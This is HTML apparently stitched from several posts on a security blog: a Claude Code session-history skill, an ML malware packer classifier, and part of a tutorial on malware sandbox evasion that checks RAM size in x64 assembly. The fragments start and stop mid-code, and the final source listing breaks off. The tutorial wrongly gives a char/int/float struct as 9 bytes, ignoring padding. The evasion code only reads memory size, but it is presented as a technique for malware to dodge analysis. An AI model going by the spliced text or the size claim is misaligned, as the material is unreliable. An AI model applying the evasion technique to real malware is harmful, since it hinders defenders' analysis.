&lt;h2 id="how-it-works"&gt;How it works&lt;/h2&gt;
&lt;p&gt;Claude Code stores session history as JSONL files in &lt;code&gt;~/.claude/projects/&amp;lt;project-dir&amp;gt;/&amp;lt;session-id&amp;gt;.jsonl&lt;/code&gt;. Each line is JSON with message type, content, timestamps, and metadata. A simple bash file locates and outputs the session JSONL:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;SESSION_FILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;find&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$PROJECTS_DIR&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-name&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SESSION_ID&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;.jsonl&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-type&lt;span class="w"&gt; &lt;/span&gt;f&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;head&lt;span class="w"&gt; &lt;/span&gt;-1&lt;span class="k"&gt;)&lt;/span&gt;
cat&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$SESSION_FILE&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Once the history is fetched, the actual analysis is left to Claude with structured guidance. I provided a template for the output format and a table of what to look for (problems, decisions, techniques, mistakes). There's a lot of freedom, since synthesizing lessons requires judgment.&lt;/p&gt;
&lt;h2 id="whats-next"&gt;What's next&lt;/h2&gt;
&lt;p&gt;The skill works for my current needs. I haven't tested it extensively on very long sessions (the JSONL can get large and might need chunking). For now, it handles my typical single-session bursts fine.&lt;/p&gt;
&lt;p&gt;Also, the output format might need iteration based on actual use. The template includes sections for "mistakes made" and "techniques worth remembering" but maybe other categories would be more useful. I'll adjust as I use it more.&lt;/p&gt;

&lt;h2 id="a-simple-solution"&gt;A Simple Solution&lt;/h2&gt;
&lt;p&gt;The solution I came up with isn't exactly original. It's based on Task Decomposition, which involves training separate models for different categories and combining their predictions. This way, I could double the classification capacity without requiring additional hardware resources.&lt;/p&gt;
&lt;p&gt;This was implemented by creating multiple machine learning models, each specializing in recognizing a subset of packers. The real challenge, however, lies in combining the predictions from these models to form a unified output.&lt;/p&gt;
&lt;p&gt;&lt;img alt="classifying-more-with-less-new-vgl4nt-update-01" src="https://www.accidentalrebel.com/images/classifying-more-with-less-new-vgl4nt-update-01.png" /&gt;&lt;/p&gt;
&lt;p&gt;Here's how the process works:&lt;/p&gt;
&lt;p&gt;The packed malware file is fed into Model 1, which outputs probabilities for Packer 1, Packer 2, and Others. For example, it might produce:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Packer 1: 10%&lt;/li&gt;
&lt;li&gt;Packer 2: 20%&lt;/li&gt;
&lt;li&gt;Others: 70%&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The same file is then fed into Model 2, which outputs probabilities for Packer 3, Packer 4, and Others. For instance:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Packer 3: 60%&lt;/li&gt;
&lt;li&gt;Packer 4: 30%&lt;/li&gt;
&lt;li&gt;Others: 10%&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I then take the 'Others' category with the lowest probability. For our example, the final 'Others' probability would be 10% from Model 2.&lt;/p&gt;
&lt;p&gt;The final probabilities are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Packer 1: 10%&lt;/li&gt;
&lt;li&gt;Packer 2: 20%&lt;/li&gt;
&lt;li&gt;Packer 3: 60%&lt;/li&gt;
&lt;li&gt;Packer 4: 30%&lt;/li&gt;
&lt;li&gt;Others: 10%&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Packer 3 has the highest probability in this example, and the file is classified as such.&lt;/p&gt;
&lt;p&gt;This simple combination approach ensures I maintain a suitable probability distribution while leveraging each model's strengths. The beauty of this method is not only its efficiency but also its scalability. I can introduce more models, each specializing in different packers, to further increase the classification capabilities.&lt;/p&gt;
&lt;p&gt;Now you might wonder why I'd even write about this if the solution is this simple. The funny thing is I've explored multiple approaches to unifying the output. Before this, I fully implemented a complicated approach, only to later realize while writing this blog post that a much simpler approach works well enough for the tool's purpose.&lt;/p&gt;
&lt;h2 id="downsides"&gt;Downsides&lt;/h2&gt;
&lt;p&gt;I am conscious that this may or may not be the most effective method to tackle this problem. But what is essential is that the current computation is simple and can maintain the appropriate prediction distribution based on the relative percentages. In essence, the category with the highest confidence score will always come out on top in the final output, primarily what users of my tool are interested in.&lt;/p&gt;
&lt;p&gt;Aside from this, I am concerned that increasing the number of categories also increases training and prediction time. I'm not too worried about the increase in training time because this happens behind the scenes and remains unseen to users of my tool. I'm slightly concerned about the longer prediction time, as all models need to process each submission to the tool. And as I plan to incorporate more packer tool categories, the prediction time will definitely rise.&lt;/p&gt;
&lt;p&gt;These downsides are not too much of a problem, however. They can easily be fixed if I find they are not meeting the tool's goals. For now, these will do.&lt;/p&gt;
&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;I am genuinely happy with my progress with the VGL4NT Malware Packer Classifier. There are other topics I want to tackle, but I'll save those for future blog posts.&lt;/p&gt;

&lt;p&gt;Traditional packer detection approaches like DiE (Detect it Easy) and Yara rules depend on known signatures and patterns to identify packers. These tools scrutinize a file for specific indicators, like unique sequences of bytes or strings. While effective in many cases, they have drawbacks, like when a packer is modified or if the sequence of bytes or strings are altered.&lt;/p&gt;
&lt;p&gt;By using machine learning, the VGL4NT Malware Packer Classifier can be able to take into account minute differences and still be able to detect the packer used.&lt;/p&gt;
&lt;h1 id="how-it-works"&gt;How it works&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;The uploaded executable file's bytes are converted into grayscale values, creating an image..&lt;/li&gt;
&lt;li&gt;The grayscale image is then fed into an image machine-learning model I trained from scratch.&lt;/li&gt;
&lt;li&gt;It returns a list of percentages on how similar it is to other Packers.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="classifying-malware-packers-using-machine-learning-01" src="https://www.accidentalrebel.com/images/classifying-malware-packers-using-machine-learning-02.png" /&gt;&lt;/p&gt;
&lt;p&gt;The approach above is nothing new and is based on &lt;a href="https://ieeexplore.ieee.org/abstract/document/8328749"&gt;this academic paper&lt;/a&gt;. The difference is that the paper has a tool that classifies malware families, while mine classifies the packers used.&lt;/p&gt;
&lt;p&gt;Most of the magic happens in the model itself. I've trained it on several packed malware samples and measured its accuracy using multiple iterations. The latest version of this model has a 94% accuracy, which is calculated by comparing the model's predictions to the actual packer labels in a dataset that the model hasn't seen before (the test dataset).&lt;/p&gt;
&lt;h1 id="current-limitations"&gt;Current limitations&lt;/h1&gt;
&lt;p&gt;The app works for the most part, but it has its limitations. For example, users can only upload executable files (EXE, Bin, ELF, DLLs, etc) with a maximum size limit of 10MB. &lt;/p&gt;
&lt;p&gt;Furthermore, due to costs of GPU resources during training, only the following packer tools can be classified:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;aspack&lt;/li&gt;
&lt;li&gt;alienyze&lt;/li&gt;
&lt;li&gt;amber&lt;/li&gt;
&lt;li&gt;mew&lt;/li&gt;
&lt;li&gt;mpress&lt;/li&gt;
&lt;li&gt;nspack&lt;/li&gt;
&lt;li&gt;pecompact&lt;/li&gt;
&lt;li&gt;petite&lt;/li&gt;
&lt;li&gt;themida&lt;/li&gt;
&lt;li&gt;upx&lt;/li&gt;
&lt;li&gt;others (Everything else)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The list of packer tools above was chosen based on available real-world malware samples that I have encountered or studied.&lt;/p&gt;
&lt;h1 id="future-plans-and-updates"&gt;Future Plans and Updates&lt;/h1&gt;
&lt;p&gt;If this project gains enough interest, then I plan to add more improvements, such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Increase GPU resources to increase the model's capacity to classify more categories&lt;/li&gt;
&lt;li&gt;Improvements in the training method by handpicking the most important parts of the executable and then feeding that to the model&lt;/li&gt;
&lt;li&gt;Offer an API for integration with existing tools and processes.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Of course, this project would improve a lot with the community's help. I encourage users to provide feedback, report issues, or request new features.

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;statex&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dwLength&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;statex&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;GlobalMemoryStatusEx&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;statex&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Memory size: %*I64d&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;statex&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ullTotalPhys&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;You will see that the first parameter for &lt;code&gt;GlobalMemoryStatusEx&lt;/code&gt; is expecting a pointer to a &lt;code&gt;MEMORYSTATUSEX&lt;/code&gt; object. We need to declare the memory location &lt;code&gt;statex&lt;/code&gt; by putting it onto the stack. Before we can do that, however, we first need to know beforehand how much we would need to reserve.&lt;/p&gt;
&lt;h2 id="getting-the-size-of-the-struct"&gt;Getting the size of the struct&lt;/h2&gt;
&lt;p&gt;Finding out the size of a structure in C is easy with the &lt;code&gt;sizeof&lt;/code&gt; function. However, we can't really use this in assembly, so we have to determine it manually by adding up the sizes of each member of the struct.&lt;/p&gt;
&lt;p&gt;Consider the example struct definition below:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;struct&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nc"&gt;TestStruct&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;member1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;member2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;float&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;member3&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;If we would look at &lt;a href="https://docs.microsoft.com/en-us/cpp/cpp/fundamental-types-cpp?view=msvc-170#sizes-of-built-in-types"&gt;this table&lt;/a&gt; containing the fundamental types and their sizes, we could determine the sizes of each member:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;member1&lt;/code&gt; is of type &lt;code&gt;char&lt;/code&gt; which has a size of &lt;em&gt;1 byte&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;member2&lt;/code&gt; is of type &lt;code&gt;int&lt;/code&gt; which is &lt;em&gt;4 bytes&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;member3&lt;/code&gt; is of type &lt;code&gt;float&lt;/code&gt; which also is &lt;em&gt;4 bytes&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Adding all of these sizes results in &lt;code&gt;TestStruct&lt;/code&gt; having a total size of &lt;em&gt;9 bytes&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Now to apply the same computation to our &lt;code&gt;MEMORYSTATUSEX&lt;/code&gt; struct. Here is the definition of the struct &lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-memorystatusex"&gt;according to MSDN&lt;/a&gt;:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;typedef&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nc"&gt;_MEMORYSTATUSEX&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;DWORD&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="n"&gt;dwLength&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;DWORD&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="n"&gt;dwMemoryLoad&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;DWORDLONG&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ullTotalPhys&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;DWORDLONG&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ullAvailPhys&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;DWORDLONG&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ullTotalPageFile&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;DWORDLONG&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ullAvailPageFile&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;DWORDLONG&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ullTotalVirtual&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;DWORDLONG&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ullAvailVirtual&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;DWORDLONG&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ullAvailExtendedVirtual&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MEMORYSTATUSEX&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;LPMEMORYSTATUSEX&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The types that we have are &lt;code&gt;DWORD&lt;/code&gt; and &lt;code&gt;DWORDLONG&lt;/code&gt; (which is just &lt;a href="https://docs.microsoft.com/en-us/windows/win32/winprog/windows-data-types?redirectedfrom=MSDN"&gt;Window's own version&lt;/a&gt; of &lt;code&gt;unsigned long&lt;/code&gt; and &lt;code&gt;unsigned int64&lt;/code&gt;):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;DWORD&lt;/code&gt; or &lt;code&gt;unsigned long&lt;/code&gt; has a size of &lt;em&gt;4 bytes&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;DWORDLONG&lt;/code&gt; or &lt;code&gt;unsigned int64&lt;/code&gt; has a size of &lt;em&gt;8 bytes&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So adding the two &lt;code&gt;DWORD&lt;/code&gt;s and seven &lt;code&gt;DWORDLONG&lt;/code&gt;s results in &lt;code&gt;MEMORYSTATUSEX&lt;/code&gt; having a total size of &lt;em&gt;64 bytes&lt;/em&gt;.&lt;/p&gt;
&lt;h2 id="initializing-statex"&gt;Initializing statex&lt;/h2&gt;
&lt;p&gt;Now that we know the total size, we can now reserve this amount of space on the stack.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0x40&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="c1"&gt;; Reserve space for struct on stack&lt;/span&gt;
&lt;span class="w"&gt;                    &lt;/span&gt;&lt;span class="c1"&gt;; MEMORYSTATUSEX&amp;#39;s is 64 bytes (0x40) in size&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Before we can call &lt;code&gt;GlobalMemoryStatusEx&lt;/code&gt;, however, &lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-memorystatusex"&gt;MSDN states&lt;/a&gt; that the &lt;code&gt;dwLength&lt;/code&gt; member should be first set. And this can be done by assigning &lt;em&gt;64 bytes&lt;/em&gt; to the corresponding memory location on the stack.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0x40&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="c1"&gt;; Assign 0x40 to dwLength&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="c1"&gt;; Load the memory location of struct&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;With this we can finally call our function:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="c1"&gt;; Reserve shadow space&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;GlobalMemoryStatusEx&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="c1"&gt;; Release shadow space&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="using-the-result"&gt;Using the result&lt;/h2&gt;
&lt;p&gt;If successful, the function &lt;code&gt;GlobalMemoryStatusEx&lt;/code&gt; populates the memory location we passed to it, as shown below:&lt;/p&gt;
&lt;p&gt;&lt;img alt="malware-sandbox-evasion-in-x64-assembly-by-checking-ram-size-part-2-01" src="https://www.accidentalrebel.com/images/malware-sandbox-evasion-in-x64-assembly-by-checking-ram-size-part-2-01.png" /&gt;&lt;/p&gt;
&lt;p&gt;The struct member &lt;code&gt;ullTotalPhys&lt;/code&gt; now has the memory size that we need. And because our stack pointer still points to the beginning of the struct, we can get this value by adding an offset to &lt;code&gt;rsp&lt;/code&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;0x8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="c1"&gt;; Retrive value of ullTotalPhys from stack&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We offset by &lt;code&gt;0x8&lt;/code&gt; because the first 8 bytes is assigned to &lt;code&gt;dwLength&lt;/code&gt; and &lt;code&gt;dwMemoryLoad&lt;/code&gt; (both at 4 bytes each).&lt;/p&gt;
&lt;h2 id="displaying-the-result"&gt;Displaying the result&lt;/h2&gt;
&lt;p&gt;As seen above, the value returned by &lt;code&gt;GlobalMemoryStatusEx&lt;/code&gt; is in bytes. To be consistent with our example from the previous post, we need to convert this value to kilobytes by dividing it by &lt;code&gt;1024&lt;/code&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rdx&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; Clear rdx; This is required before calling div&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;div&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="c1"&gt;; Divide by 1024 to convert to KB&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The result of the above operation is saved to &lt;code&gt;rax&lt;/code&gt; which we can then move to &lt;code&gt;rdx&lt;/code&gt; so we can pass it as the second argument to &lt;code&gt;printf&lt;/code&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; Argument 2; Result of ullTotalPhys / 1024&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;msg_memory_size&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="c1"&gt;; Argument 1; Format string&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="c1"&gt;; Reserve shadow space&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;printf&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="c1"&gt;; Release shadow space&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;With this, we can now finally display the result on the console:&lt;/p&gt;
&lt;p&gt;&lt;img alt="malware-sandbox-evasion-in-x64-assembly-by-checking-ram-size-part-2-02" src="https://www.accidentalrebel.com/images/malware-sandbox-evasion-in-x64-assembly-by-checking-ram-size-part-2-02.png" /&gt;&lt;/p&gt;
&lt;p&gt;Here is the full source code for reference:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;bits&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;default&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rel&lt;/span&gt;

